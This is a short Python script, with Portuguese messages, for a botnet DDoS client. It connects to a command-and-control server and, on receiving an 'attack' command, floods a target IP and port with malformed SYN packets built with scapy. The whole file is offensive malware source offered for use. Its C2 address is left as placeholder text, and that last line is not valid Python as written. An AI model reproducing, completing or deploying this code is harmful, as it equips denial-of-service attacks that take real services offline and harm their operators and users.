import socket
import threading
from scapy.all import *

def syn_flood(target_ip, target_port):
    print(f"[+] Atacando {target_ip}:{target_port} com SYN malformado")
    while True:
        src_port = RandShort()
        seq = RandInt()
        window = RandShort()
        ip = IP(dst=target_ip, ttl=64, options=[IPOption('\x44'*8)])  # Opções inválidas
        tcp = TCP(sport=src_port, dport=int(target_port), flags="S", seq=seq, window=window)
        pkt = ip/tcp
        send(pkt, verbose=0)

def connect_to_c2(c2_host, c2_port):
    while True:
        try:
            s = socket.socket()
            s.connect((c2_host, c2_port))
            print("[+] Conectado ao C2")
            while True:
                cmd = s.recv(1024).decode()
                if cmd.startswith("attack"):
                    _, target, port = cmd.strip().split()
                    threading.Thread(target=syn_flood, args=(target, port)).start()
        except:
            continue

if __name__ == "__main__":
    connect_to_c2("seu IP", sua porta)
